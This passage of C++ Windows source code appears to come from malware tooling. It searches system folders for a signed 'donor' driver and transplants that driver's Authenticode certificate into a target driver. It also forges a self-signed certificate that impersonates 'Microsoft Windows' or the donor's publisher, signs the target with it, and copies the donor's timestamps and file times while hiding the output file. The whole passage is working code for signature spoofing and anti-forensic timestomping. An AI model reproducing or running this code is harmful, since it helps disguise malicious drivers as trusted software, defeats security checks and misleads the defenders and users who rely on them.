            wcscat_s(subDir, L"\\");
            wcscat_s(subDir, fd.cFileName);

            ScanDirectoryRecursive(subDir, pattern, outPath, outChars, outIsEV, pBestScore, maxDepth - 1);

            if (*pBestScore >= 1000) break;
        } while (FindNextFileW(hFind, &fd));

        FindClose(hFind);
    }

    static BOOL FindSignedDonorDriver(WCHAR* outPath, SIZE_T outChars, BOOL* outIsEV) {
        *outIsEV = FALSE;
        int bestScore = 0;

        WCHAR driversDir[MAX_PATH];
        GetSystemDirectoryW(driversDir, MAX_PATH);
        wcscat_s(driversDir, L"\\drivers");

        ScanDirectoryForSignedDriver(driversDir, L"*.sys", outPath, outChars, outIsEV, &bestScore);

        if (bestScore < 1000) {
            WCHAR sys32Dir[MAX_PATH];
            GetSystemDirectoryW(sys32Dir, MAX_PATH);
            ScanDirectoryForSignedDriver(sys32Dir, L"*.sys", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR sys32Dir[MAX_PATH];
            GetSystemDirectoryW(sys32Dir, MAX_PATH);
            ScanDirectoryForSignedDriver(sys32Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR sys32Dir[MAX_PATH];
            GetSystemDirectoryW(sys32Dir, MAX_PATH);
            ScanDirectoryForSignedDriver(sys32Dir, L"*.exe", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR sysWow64Dir[MAX_PATH];
            GetWindowsDirectoryW(sysWow64Dir, MAX_PATH);
            wcscat_s(sysWow64Dir, L"\\SysWOW64");
            ScanDirectoryForSignedDriver(sysWow64Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR driverStoreDir[MAX_PATH];
            GetWindowsDirectoryW(driverStoreDir, MAX_PATH);
            wcscat_s(driverStoreDir, L"\\System32\\DriverStore\\FileRepository");
            ScanDirectoryRecursive(driverStoreDir, L"*.sys", outPath, outChars, outIsEV, &bestScore, 2);
        }

        if (bestScore < 1000) {
            WCHAR programFilesDir[MAX_PATH];
            if (GetEnvironmentVariableW(L"ProgramFiles", programFilesDir, MAX_PATH)) {
                ScanDirectoryRecursive(programFilesDir, L"*.exe", outPath, outChars, outIsEV, &bestScore, 3);
                if (bestScore < 1000) {
                    ScanDirectoryRecursive(programFilesDir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
                }
            }
        }

        if (bestScore < 1000) {
            WCHAR programFilesX86Dir[MAX_PATH];
            if (GetEnvironmentVariableW(L"ProgramFiles(x86)", programFilesX86Dir, MAX_PATH)) {
                ScanDirectoryRecursive(programFilesX86Dir, L"*.exe", outPath, outChars, outIsEV, &bestScore, 3);
                if (bestScore < 1000) {
                    ScanDirectoryRecursive(programFilesX86Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
                }
            }
        }

        if (bestScore < 1000) {
            WCHAR commonFilesDir[MAX_PATH];
            if (GetEnvironmentVariableW(L"CommonProgramFiles", commonFilesDir, MAX_PATH)) {
                ScanDirectoryRecursive(commonFilesDir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
            }
        }

        if (bestScore < 1000) {
            WCHAR commonFilesX86Dir[MAX_PATH];
            if (GetEnvironmentVariableW(L"CommonProgramFiles(x86)", commonFilesX86Dir, MAX_PATH)) {
                ScanDirectoryRecursive(commonFilesX86Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
            }
        }

        return (bestScore > 0);
    }

    BOOL TransplantCertificateToDriver(LPCWSTR targetDriverPath) {
        WCHAR donorPath[MAX_PATH] = {};
        BOOL isEV = FALSE;

        if (!FindSignedDonorDriver(donorPath, MAX_PATH, &isEV)) {
            return FALSE;
        }

        CERT_BUFFER certBuf = {};
        if (!ExtractCertificateData(donorPath, &certBuf)) {
            return FALSE;
        }

        DWORD donorTimeDateStamp = 0;
        FILETIME donorCreation = {}, donorLastWrite = {}, donorLastAccess = {};
        {
            HANDLE hDonor = CreateFileW(donorPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hDonor != INVALID_HANDLE_VALUE) {
                GetFileTime(hDonor, &donorCreation, &donorLastAccess, &donorLastWrite);
                BYTE donorHdr[4096];
                DWORD donorBr = 0;
                if (ReadFile(hDonor, donorHdr, sizeof(donorHdr), &donorBr, nullptr) &&
                    donorBr >= sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) {
                    PIMAGE_DOS_HEADER dDos = (PIMAGE_DOS_HEADER)donorHdr;
                    if (dDos->e_magic == IMAGE_DOS_SIGNATURE &&
                        (DWORD)dDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) <= donorBr) {
                        PIMAGE_NT_HEADERS dNt = (PIMAGE_NT_HEADERS)(donorHdr + dDos->e_lfanew);
                        if (dNt->Signature == IMAGE_NT_SIGNATURE) {
                            donorTimeDateStamp = dNt->FileHeader.TimeDateStamp;
                        }
                    }
                }
                CloseHandle(hDonor);
            }
        }

        HANDLE hTarget = CreateFileW(targetDriverPath, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hTarget == INVALID_HANDLE_VALUE) {
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD targetFileSize = GetFileSize(hTarget, nullptr);
        if (targetFileSize == INVALID_FILE_SIZE || targetFileSize < 4096) {
            CloseHandle(hTarget);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD certOffset = (targetFileSize + 7) & ~7UL;
        DWORD finalSize = certOffset + certBuf.Size;

        BYTE* finalData = (BYTE*)VirtualAlloc(nullptr, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!finalData) {
            CloseHandle(hTarget);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD bytesRead = 0;
        if (!ReadFile(hTarget, finalData, targetFileSize, &bytesRead, nullptr) || bytesRead != targetFileSize) {
            CloseHandle(hTarget);
            VirtualFree(finalData, 0, MEM_RELEASE);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }
        CloseHandle(hTarget);

        PIMAGE_DOS_HEADER targetDos = (PIMAGE_DOS_HEADER)finalData;
        if (targetDos->e_magic != IMAGE_DOS_SIGNATURE) {
            VirtualFree(finalData, 0, MEM_RELEASE);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        PIMAGE_NT_HEADERS64 targetNt = (PIMAGE_NT_HEADERS64)(finalData + targetDos->e_lfanew);
        if (targetNt->Signature != IMAGE_NT_SIGNATURE) {
            VirtualFree(finalData, 0, MEM_RELEASE);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        if (donorTimeDateStamp != 0) {
            targetNt->FileHeader.TimeDateStamp = donorTimeDateStamp;
        }

        targetNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = certOffset;
        targetNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certBuf.Size;
        targetNt->OptionalHeader.CheckSum = 0;

        if (certOffset > targetFileSize) {
            memset(finalData + targetFileSize, 0, certOffset - targetFileSize);
        }

        memcpy(finalData + certOffset, certBuf.Data, certBuf.Size);
        VirtualFree(certBuf.Data, 0, MEM_RELEASE);

        DWORD checksum = ComputePEChecksum(finalData, finalSize);
        targetNt->OptionalHeader.CheckSum = checksum;

        HANDLE hWrite = CreateFileW(targetDriverPath, GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hWrite == INVALID_HANDLE_VALUE) {
            VirtualFree(finalData, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD written = 0;
        BOOL writeOk = WriteFile(hWrite, finalData, finalSize, &written, nullptr);
        FlushFileBuffers(hWrite);
        if (donorCreation.dwHighDateTime != 0 || donorCreation.dwLowDateTime != 0) {
            SetFileTime(hWrite, &donorCreation, &donorLastAccess, &donorLastWrite);
        }
        CloseHandle(hWrite);
        VirtualFree(finalData, 0, MEM_RELEASE);

        if (!writeOk || written != finalSize) {
            return FALSE;
        }

        return TRUE;
    }


#ifndef CALG_SHA_256
#define CALG_SHA_256 0x0000800c
#endif


    struct SS_FILE_INFO      { DWORD cbSize; LPCWSTR pwszFileName; HANDLE hFile; };
    struct SS_SUBJECT_INFO   { DWORD cbSize; DWORD* pdwIndex; DWORD dwSubjectChoice; SS_FILE_INFO* pFileInfo; };
    struct SS_CERT_STORE_INFO{ DWORD cbSize; PCCERT_CONTEXT pSigningCert; DWORD dwCertPolicy; HCERTSTORE hCertStore; };
    struct SS_CERT           { DWORD cbSize; DWORD dwCertChoice; SS_CERT_STORE_INFO* pStoreInfo; HWND hwnd; };
    struct SS_SIGNATURE_INFO { DWORD cbSize; ALG_ID algidHash; DWORD dwAttrChoice; void* pAttrAuthcode;
                               PCRYPT_ATTRIBUTES psAuth; PCRYPT_ATTRIBUTES psUnauth; };

    typedef HRESULT(WINAPI* pfnSignerSign)(SS_SUBJECT_INFO*, SS_CERT*, SS_SIGNATURE_INFO*,
                                           void*, LPCWSTR, PCRYPT_ATTRIBUTES, LPVOID);

    BOOL SelfSignDriver(LPCWSTR targetDriverPath) {
        HMODULE hMssign = LoadLibraryW(L"mssign32.dll");
        if (!hMssign) {
            return FALSE;
        }

        auto pSign = (pfnSignerSign)GetProcAddress(hMssign, "SignerSign");
        if (!pSign) {
            FreeLibrary(hMssign);
            return FALSE;
        }


        WCHAR donorPath[MAX_PATH] = {};
        BOOL isEV = FALSE;
        CERT_NAME_BLOB subjectBlob = {};
        BYTE* pAllocSubject = nullptr;

        if (FindSignedDonorDriver(donorPath, MAX_PATH, &isEV) && donorPath[0]) {
            WINTRUST_FILE_INFO wfi = {};
            wfi.cbStruct = sizeof(wfi);
            wfi.pcwszFilePath = donorPath;

            GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
            WINTRUST_DATA wtd = {};
            wtd.cbStruct = sizeof(wtd);
            wtd.dwUIChoice = WTD_UI_NONE;
            wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
            wtd.dwUnionChoice = WTD_CHOICE_FILE;
            wtd.pFile = &wfi;
            wtd.dwStateAction = WTD_STATEACTION_VERIFY;
            wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

            WinVerifyTrust(NULL, &actionGUID, &wtd);

            if (wtd.hWVTStateData) {
                CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(wtd.hWVTStateData);
                if (prov) {
                    CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
                    if (sgnr && sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                        CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                        if (chain->cElement > 0) {
                            PCCERT_CONTEXT donorCert = chain->rgpElement[0]->pCertContext;
                            char displayName[256] = {};
                            CertNameToStrA(X509_ASN_ENCODING, &donorCert->pCertInfo->Subject,
                                           CERT_X500_NAME_STR, displayName, sizeof(displayName));
                            DWORD cb = donorCert->pCertInfo->Subject.cbData;
                            pAllocSubject = (BYTE*)LocalAlloc(LPTR, cb);
                            if (pAllocSubject) {
                                memcpy(pAllocSubject, donorCert->pCertInfo->Subject.pbData, cb);
                                subjectBlob.pbData = pAllocSubject;
                                subjectBlob.cbData = cb;
                            }
                        }
                    }
                }
            }

            wtd.dwStateAction = WTD_STATEACTION_CLOSE;
            WinVerifyTrust(NULL, &actionGUID, &wtd);
        }


        if (!subjectBlob.pbData) {
            LPCSTR fallback = "CN=Microsoft Windows, O=Microsoft Corporation";
            DWORD cbEnc = 0;
            CertStrToNameA(X509_ASN_ENCODING, fallback, CERT_X500_NAME_STR, NULL, NULL, &cbEnc, NULL);
            if (cbEnc > 0) {
                pAllocSubject = (BYTE*)LocalAlloc(LPTR, cbEnc);
                if (pAllocSubject) {
                    CertStrToNameA(X509_ASN_ENCODING, fallback, CERT_X500_NAME_STR, NULL, pAllocSubject, &cbEnc, NULL);
                    subjectBlob.pbData = pAllocSubject;
                    subjectBlob.cbData = cbEnc;
                }
            }
        }

        if (!subjectBlob.pbData) {
            FreeLibrary(hMssign);
            return FALSE;
        }


        WCHAR container[64];
        swprintf_s(container, L"WM_%llu", __rdtsc());

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContextW(&hProv, container, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
            LocalFree(pAllocSubject);
            FreeLibrary(hMssign);
            return FALSE;
        }

        HCRYPTKEY hKey = 0;
        if (!CryptGenKey(hProv, AT_SIGNATURE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            LocalFree(pAllocSubject);
            FreeLibrary(hMssign);
            return FALSE;
        }


        char ekuOidBuf[] = "1.3.6.1.5.5.7.3.3";
        LPSTR ekuOid = ekuOidBuf;
        CERT_ENHKEY_USAGE enhKU = {};
        enhKU.cUsageIdentifier = 1;
        enhKU.rgpszUsageIdentifier = &ekuOid;

        BYTE ekuEncoded[256] = {};
        DWORD ekuLen = sizeof(ekuEncoded);
        if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_ENHANCED_KEY_USAGE, &enhKU, 0, NULL, ekuEncoded, &ekuLen)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            LocalFree(pAllocSubject);
            FreeLibrary(hMssign);
            return FALSE;
        }

        char ekuExtOid[] = "2.5.29.37";
        CERT_EXTENSION ext = {};
        ext.pszObjId = ekuExtOid;
        ext.fCritical = FALSE;
        ext.Value.cbData = ekuLen;
        ext.Value.pbData = ekuEncoded;

        CERT_EXTENSIONS exts = {};
        exts.cExtension = 1;
        exts.rgExtension = &ext;

        CRYPT_KEY_PROV_INFO kpi = {};
        kpi.pwszContainerName = container;
        kpi.dwProvType = PROV_RSA_FULL;
        kpi.dwKeySpec = AT_SIGNATURE;

        SYSTEMTIME stEnd = {};
        GetSystemTime(&stEnd);
        stEnd.wYear += 10;

        PCCERT_CONTEXT pCert = CertCreateSelfSignCertificate(
            hProv, &subjectBlob, 0, &kpi, NULL, NULL, &stEnd, &exts);

        LocalFree(pAllocSubject);
        pAllocSubject = nullptr;

        if (!pCert) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            FreeLibrary(hMssign);
            return FALSE;
        }


        HCERTSTORE hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, 0, NULL);
        if (!hStore) {
            CertFreeCertificateContext(pCert);
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            FreeLibrary(hMssign);
            return FALSE;
        }

        PCCERT_CONTEXT pStoreCert = NULL;
        CertAddCertificateContextToStore(hStore, pCert, CERT_STORE_ADD_ALWAYS, &pStoreCert);
        CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &kpi);


        SS_FILE_INFO       fi  = { sizeof(fi), targetDriverPath, NULL };
        DWORD              idx = 0;
        SS_SUBJECT_INFO    si  = { sizeof(si), &idx, 1 , &fi };
        SS_CERT_STORE_INFO csi = { sizeof(csi), pStoreCert, 2 , NULL };
        SS_CERT            sc  = { sizeof(sc), 2 , &csi, NULL };
        SS_SIGNATURE_INFO  ssi = { sizeof(ssi), CALG_SHA_256, 0 , NULL, NULL, NULL };

        HRESULT hr = pSign(&si, &sc, &ssi, NULL, NULL, NULL, NULL);


        if (pStoreCert) CertFreeCertificateContext(pStoreCert);
        CertFreeCertificateContext(pCert);
        CertCloseStore(hStore, 0);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
        FreeLibrary(hMssign);

        if (FAILED(hr)) {
            return FALSE;
        }


        if (donorPath[0]) {
            HANDLE hDonor = CreateFileW(donorPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hDonor != INVALID_HANDLE_VALUE) {
                FILETIME ftCreate, ftAccess, ftWrite;
                if (GetFileTime(hDonor, &ftCreate, &ftAccess, &ftWrite)) {
                    CloseHandle(hDonor);
                    HANDLE hTarget = CreateFileW(targetDriverPath, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ,
                        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hTarget != INVALID_HANDLE_VALUE) {
                        SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
                        CloseHandle(hTarget);
                    }
                } else {
                    CloseHandle(hDonor);
                }
            }
        }

        return TRUE;
    }
}
